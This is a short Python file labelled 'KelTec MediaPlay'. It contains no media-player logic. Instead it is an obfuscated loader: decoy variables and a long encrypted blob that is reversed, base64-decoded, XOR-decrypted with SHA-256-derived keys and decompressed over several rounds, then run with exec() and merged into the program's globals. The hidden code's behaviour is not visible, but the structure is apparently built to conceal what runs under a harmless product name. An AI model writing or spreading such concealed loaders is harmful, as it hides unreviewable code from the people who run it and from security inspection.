# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 650163 ^ 971089
_lx1_1 = len("234ef9")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-517725)
_lx3_3 = 712943 * 0
_lx4_4 = 480180 ^ 898129
_K = '08e4ab29f0efc6ab55d813f40914280692c0e927f9976d3d238dec9f98d0de90'
_M = 'PkXLIgCqnSPLBKIde5ra+QnxLj1SX6kiBeMQjzxrlR0vGMskHO3PMMhUrk1+m9j7WfZ/OlhTpHcNvUyJbGrITiwXnSMe755hlwb+'
_D = 'iyE5p2H/P6FevioIpig1Yf47+gqql0Ad9tGuuK8f8aN0Xer4itPk8+up7D3i8hFmJdIDhcYldb6ZeR4YtEoZrR1YlhLZpRokDm0EHp6PKQL9r1kc0hdrE+RXMMHC/L6RHG0K6DUyDtBp5/rsacbsRxafsU4cqo23dFx66Segx82WfCNzumBrsVEBFmwsPzzR9fu3GUxSbgx5jVfyJ12vLrZVuL7psly/XJFZbszQyNOBZZvN3RRqB9roTQ0KeeW3XprmR5PqUdCV7T5yKV3/kzTvUa8uCEe43vl4GCTu+mT/EOAT2p3A8X/1z9iPdwN1tuAyzypATToziGs7+KmpdxE3jdQucYDAloNWyBFwFEqrTsUtE2zXxa3uNonw2edJGkjIoRKHsA8jQkZR28OKtkjC5ueqP6Nr6rymyrkJSz4V5A6po5KULYQo+h31nFrUvTzVuP08mGkzRQIQ6iVHU36QFZq9eKo4Bn9EXwo5uch8H/Q/wFOVkcs8cCOX3jtLM6LrBif3uiN9bBm4/mo4HifTJN22BjgIHKbIEDVvY51sKy8TOkJYq/PVVLtZxMyPzXnSqcyxRl8mWXJfIZAaKwvkHxgP4SWJHJBXeQ99AqeMK2DHIfshsaLFVdlVCrptXs76xZudliBmQXr/sbeneB7nYsxMXLlOtTSjff1C7N0FXsb6rOzLn5zjdn6LTR5iZSfFOh8A4dbt/dyMJCNCSNVnfeIb78ZR6fdfI/vS+eXJgwx/mWZWbqz+InROvy/YEM3y3nu5ODfhuFQzNEdehJCbMDoS+4JhHPgoDEqfEggUnDkq51pyfQ4V9YgC3TS7wKpbekelMysCU14Forxc2IW3uyJ43SS5lfvOg/jrypu+Wjk8YE1/12VaHNhyx7ZQ7kQ5rqTVScca4m6hhyw8wMRZK8I3GY6ZqPeNUcASukyTTZV7gtVnuRs8uRZDk8c9wcZ3YiydVDC9nYMThm19YE0lBpYtyHHGKzgWcYkxvue89/jzJPXcmpax9afPRPqHdY7BvdV6vIAhVlIJQ0Gk7tvOCYhrl7Xkx4XWTvMLMXOEde/3SvL2lr9/sSShJASM4oU8d8Dt1Wi5kzYGDJtFf/9iDGKWe5S6bCe6TGGiKfA8JsLn/AWFh+oF7nEjJcnKJr7Z1tkzmGJaOUFYOduvUpnYkfTGfxwSrGQoBUWoGU2uJdoy5g5qKJhFHuup+Nm3lZNnxXiB1WpjjZQEa4nNxqRQhBBj7WmtfAUBHQllK2vLblNnYD8NPj0yZLaCxcOXiLJIhYKfYwK8vIbAAL6tWfpXLPyULCp000awZFZGxQIn/PKbsvkHMqdwkAlgrh945XQWmizniVHigI+HlI9MzXtf5TqCwJ+z/xhVnXDhBocjrMu5s3g1yureSkHuFhO/SfOQps2MJC9OdRqDK7IY3/sNsCwbhSDqh1+FebQSNl0ko7wQQFYw0THSuVPesXnFWPhGRcXspJOdBEGHV4vPaTMxdQ+maz89OLmRbhs3my+eqWeDpTsA5ZDoUrJrRx43kGQnSG9k8iOPf1AkgcgQss/LvYVBx2DFGwXoP9HDESpvKJ3Fb8syKBMVgQJHLIIPvr6+V+mKG13WaTcAmzaj0ln5BuddErUjrSU3PxZ2kq830XObvMG/V7k7m8pXDJ3Yd1gAm7nDzKEzdGRv1Hw15ndm+J8xvTZ2MqcuZ/4Oqka1D3dFgtgUvQwe0+r8Z9Bn6NrVzw5A+N6tyw7fCWUMe1NGWa7B2k1eT1qCOPLlvkn2F8UGfnwRmyWC7xzCzDxy5/MBefyhrFht9U0X1H4ztJDG3/M+hiqxU5J6q0TnyU0eo7U0Mtbfc1QYn1TPTGzz4Gj31SnWskTYMflEAjte'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})